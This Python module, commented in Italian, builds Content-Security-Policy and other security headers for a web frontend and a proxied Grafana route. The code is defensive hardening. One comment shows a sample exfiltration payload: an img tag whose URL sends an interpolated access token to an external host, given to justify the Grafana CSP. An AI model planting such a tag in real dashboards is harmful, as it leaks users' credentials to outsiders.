"""Intestazioni HTTP di sicurezza del frontend: UNA definizione (P31).

Il frontend in produzione e' servito da Caddy (servizio Windows
``plenora-caddy``, Caddyfile generato da ``scripts/install-native.ps1``) e,
nell'ambiente Docker di sviluppo, da nginx (``frontend/nginx.conf``).
Nessuno dei due scrive a mano le intestazioni: le ricevono da qui.

- Caddy: l'installer esegue ``python -m app.core.security.frontend_headers
  --format caddy`` con la configurazione reale (``backend/.env``) e il
  Caddyfile importa il file prodotto.
- nginx (Docker): ``frontend/security-headers.nginx.conf`` e' l'uscita di
  ``--format nginx`` con i soli DEFAULTS; un test la confronta con questo
  modulo, quindi non puo' divergere.
- Vite (``npm run dev`` / ``npm run preview``): legge lo stesso file nginx
  (``frontend/vite-plugins/securityHeaders.js``); in sviluppo la CSP e'
  Report-Only.

Regola della CSP: tutto dallo stesso origin; le sole origini esterne sono
quelle dichiarate in configurazione (``config.py`` DEFAULTS):
``FRONTEND_MAP_TILE_ORIGINS`` (immagini delle tile Leaflet) e l'origine del
DSN ``FRONTEND_SENTRY_DSN`` (invio degli eventi), piu' l'eventuale API su un
altro host (``--api-url``, lo stesso valore che l'installer passa a
``VITE_API_URL``). Niente ``'unsafe-inline'`` ne' ``'unsafe-eval'``: la build
Vite non ha script inline (il tema iniziale e' in ``public/theme-init.js``) e
gli stili dinamici di React/Leaflet/React Flow passano dal CSSOM
(``element.style``), che la CSP non blocca. ``frame-src 'self'``: Plenora
incorpora solo pagine del proprio origin (``/grafana``); ``frame-ancestors
'none'``: Plenora non si lascia incorporare da nessuno.

Grafana (opzionale, ``-InstallGrafana``) e' servito da Caddy su ``/grafana``
con intestazioni PROPRIE (:data:`GRAFANA_PROXY_HEADERS`, ``--format
caddy-grafana``): Grafana richiede script e stili inline, quindi la CSP di
Plenora non gli si applica; la sua (:data:`GRAFANA_CSP`) tiene ogni
caricamento sullo stesso origin (un pannello Testo non puo' portare fuori il
lasciapassare) e lo lascia incorporare solo dallo stesso origin;
``Referrer-Policy: no-referrer`` impedisce che il lasciapassare nell'URL
della dashboard esca come Referer.
"""

from __future__ import annotations

import argparse
import json
import re
import sys
from pathlib import Path
from typing import Any, Mapping, Optional
from urllib.parse import urlsplit

from app.config import Settings, settings as runtime_settings
from app.config_env_loader import load_backend_dotenv
from app.core.io.local_filesystem import write_local_bytes


CSP_HEADER = "Content-Security-Policy"
CSP_REPORT_ONLY_HEADER = "Content-Security-Policy-Report-Only"

# Intestazioni fisse, servite accanto alla CSP.
STATIC_HEADERS: tuple[tuple[str, str], ...] = (
    ("X-Content-Type-Options", "nosniff"),
    # L'origine (non il percorso) verso altri siti: i server di tile OSM
    # rifiutano le richieste senza Referer.
    ("Referrer-Policy", "strict-origin-when-cross-origin"),
    # Doppione di frame-ancestors per i browser che non lo leggono.
    ("X-Frame-Options", "DENY"),
    # Funzioni del browser che l'app non usa: negate a tutti.
    ("Permissions-Policy", "camera=(), microphone=(), geolocation=(), payment=(), usb=()"),
)

# Origine ammessa in configurazione: schema http(s), host (jolly `*.` solo
# come primo livello), porta facoltativa. Niente percorsi, spazi, apici o `;`
# che altererebbero la policy.
_ORIGIN_RE = re.compile(
    r"^https?://(\*\.)?[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?"
    r"(?:\.[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?)*(?::\d{1,5})?$"
)


def _origin_list(raw: Any, key: str) -> list[str]:
    values = [part for part in re.split(r"[\s,]+", str(raw or "").strip()) if part]
    for value in values:
        if not _ORIGIN_RE.match(value):
            raise ValueError(
                f"{key}: {value!r} non e' un'origine valida (atteso scheme://host[:porta])"
            )
    return list(dict.fromkeys(values))


def _url_origin(url: str, key: str) -> Optional[str]:
    """Origine (scheme://host[:porta]) di un URL assoluto; None se vuoto/relativo."""
    url = (url or "").strip()
    if not url or url.startswith("/"):
        return None
    parts = urlsplit(url)
    host = parts.hostname or ""
    origin = f"{parts.scheme}://{host}" + (f":{parts.port}" if parts.port else "")
    if parts.scheme not in ("http", "https") or not _ORIGIN_RE.match(origin):
        raise ValueError(f"{key}: {url!r} non e' un URL http(s) assoluto valido")
    return origin


def build_csp(
    *,
    map_tile_origins: list[str],
    connect_origins: list[str],
) -> str:
    """La policy, direttiva per direttiva."""
    directives: tuple[tuple[str, list[str]], ...] = (
        ("default-src", ["'self'"]),
        ("script-src", ["'self'"]),
        ("style-src", ["'self'"]),
        ("img-src", ["'self'", "data:", "blob:", *map_tile_origins]),
        ("font-src", ["'self'"]),
        ("connect-src", ["'self'", *connect_origins]),
        # Solo iframe dello stesso origin: la vista dashboard incorpora
        # /grafana (servito da Caddy sullo stesso host). Esplicito anche se
        # default-src lo darebbe gia'.
        ("frame-src", ["'self'"]),
        ("object-src", ["'none'"]),
        ("base-uri", ["'self'"]),
        ("form-action", ["'self'"]),
        ("frame-ancestors", ["'none'"]),
    )
    return "; ".join(f"{name} {' '.join(dict.fromkeys(sources))}" for name, sources in directives)


def build_frontend_security_headers(
    settings: Any,
    *,
    api_url: str = "",
    report_only: Optional[bool] = None,
) -> Mapping[str, str]:
    """Intestazioni da servire su ogni risposta del frontend (in ordine)."""
    tiles = _origin_list(settings.get("FRONTEND_MAP_TILE_ORIGINS", ""), "FRONTEND_MAP_TILE_ORIGINS")
    connect = [
        origin
        for origin in (
            _url_origin(str(settings.get("FRONTEND_SENTRY_DSN", "") or ""), "FRONTEND_SENTRY_DSN"),
            _url_origin(api_url, "--api-url"),
        )
        if origin
    ]
    if report_only is None:
        report_only = bool(settings.get("FRONTEND_CSP_REPORT_ONLY", False))
    csp_name = CSP_REPORT_ONLY_HEADER if report_only else CSP_HEADER
    headers = {csp_name: build_csp(map_tile_origins=tiles, connect_origins=connect)}
    headers.update(STATIC_HEADERS)
    for name, value in headers.items():
        if '"' in value or "\n" in value or "\r" in value:
            raise ValueError(f"valore non rappresentabile per {name}: {value!r}")
    return headers


def vite_build_env(settings: Any) -> Mapping[str, str]:
    """Variabili della build Vite che devono coincidere con la CSP."""
    return {"VITE_SENTRY_DSN": str(settings.get("FRONTEND_SENTRY_DSN", "") or "").strip()}


class DefaultsOnly:
    """Vista dei soli DEFAULTS, con la stessa `get` di Settings."""

    def __init__(self, defaults: Mapping[str, Any]) -> None:
        self._defaults = defaults

    def get(self, key: str, default: Any = None) -> Any:
        return self._defaults.get(key, default)


GENERATED_NOTE = (
    "Generato da backend/app/core/security/frontend_headers.py: non modificare a mano."
)


# CSP delle risposte di /grafana (correzione 11/11/2026). Chi modifica una
# dashboard puo' scrivere HTML in un pannello Testo, e Grafana vi interpola
# le variabili, compreso il lasciapassare (``${pass}``): senza CSP un
# ``<img src="https://esterno/?p=${pass}">`` lo porterebbe fuori al primo che
# apre la dashboard. Qui ogni caricamento resta sullo stesso origin
# (``default-src``/``img-src``/``connect-src 'self'``, ``form-action``,
# ``base-uri``); Grafana 13 richiede script e stili inline ed ``eval``
# (``'unsafe-inline' 'unsafe-eval'``, ``blob:`` per i worker): provato dal
# vivo con Grafana 13.3 + Infinity 4.1.6 dietro Caddy, dashboard in kiosk
# nell'iframe, editor del pannello, impostazioni ed elenco senza nessuna
# violazione; il pannello Testo con immagine e sfondo esterni bloccato
# (nessuna richiesta all'esterno). ``frame-ancestors 'self'``: Grafana si
# incorpora solo nelle pagine Plenora. L'interpolazione delle variabili nel
# pannello Testo non si disattiva in Grafana OSS (``disable_sanitize_html``
# e' gia' false: HTML ripulito, niente script); il confine e' questa CSP.
GRAFANA_CSP = "; ".join((
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:",
    "style-src 'self' 'unsafe-inline' blob:",
    "img-src 'self' data: blob:",
    "font-src 'self' data:",
    "connect-src 'self'",
    "media-src 'self'",
    "worker-src 'self' blob:",
    "frame-src 'self'",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'self'",
))

# Intestazioni delle risposte di /grafana (blocco Caddy dedicato). Grafana si
# incorpora solo nelle pagine Plenora (stesso origin); X-Frame-Options e' tolta
# perche' DENY/SAMEORIGIN non distinguerebbe e la CSP basta.
GRAFANA_PROXY_HEADERS: tuple[tuple[str, str], ...] = (
    (CSP_HEADER, GRAFANA_CSP),
    ("X-Content-Type-Options", "nosniff"),
    ("Referrer-Policy", "no-referrer"),
    ("Permissions-Policy", dict(STATIC_HEADERS)["Permissions-Policy"]),
)
GRAFANA_PROXY_REMOVED_HEADERS: tuple[str, ...] = ("X-Frame-Options",)


def render_nginx(headers: Mapping[str, str]) -> str:
    lines = [
        f"# {GENERATED_NOTE}",
        "# Rigenera (da backend/): python -m app.core.security.frontend_headers"
        " --format nginx --defaults-only --output ../frontend/security-headers.nginx.conf",
    ]
    lines += [f'add_header {name} "{value}" always;' for name, value in headers.items()]
    return "\n".join(lines) + "\n"


def render_caddy(headers: Mapping[str, str]) -> str:
    lines = [f"# {GENERATED_NOTE}", "header {"]
    lines += [f'    {name} "{value}"' for name, value in headers.items()]
    lines.append("}")
    return "\n".join(lines) + "\n"


def render_caddy_grafana() -> str:
    """Blocco ``header`` per la route /grafana di Caddy.

    ``defer``: si applica quando la risposta e' scritta, quindi vince sulle
    intestazioni di Grafana e copre anche il 401 di ``forward_auth``.
    """
    lines = [f"# {GENERATED_NOTE}", "header {", "    defer"]
    lines += [f"    -{name}" for name in GRAFANA_PROXY_REMOVED_HEADERS]
    lines += [f'    {name} "{value}"' for name, value in GRAFANA_PROXY_HEADERS]
    lines.append("}")
    return "\n".join(lines) + "\n"


def main(argv: Optional[list[str]] = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument(
        "--format", choices=("caddy", "caddy-grafana", "nginx", "json"), required=True
    )
    parser.add_argument("--api-url", default="", help="VITE_API_URL della build (vuoto = same-origin)")
    parser.add_argument("--output", type=Path, help="file di destinazione (default: stdout)")
    parser.add_argument(
        "--defaults-only",
        action="store_true",
        help="ignora ambiente e .env (per frontend/security-headers.nginx.conf)",
    )
    args = parser.parse_args(argv)

    if args.defaults_only:
        settings: Any = DefaultsOnly(Settings.DEFAULTS)
    else:
        # Come i servizi: backend/.env letto qui (Settings legge l'ambiente vivo).
        load_backend_dotenv()
        settings = runtime_settings

    headers = build_frontend_security_headers(settings, api_url=args.api_url)
    if args.format == "nginx":
        text = render_nginx(headers)
    elif args.format == "caddy":
        text = render_caddy(headers)
    elif args.format == "caddy-grafana":
        text = render_caddy_grafana()
    else:
        payload = {"headers": dict(headers), "vite_env": dict(vite_build_env(settings))}
        text = json.dumps(payload, indent=2) + "\n"
    if args.output:
        write_local_bytes(args.output, text.encode("ascii"))
    else:
        sys.stdout.write(text)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
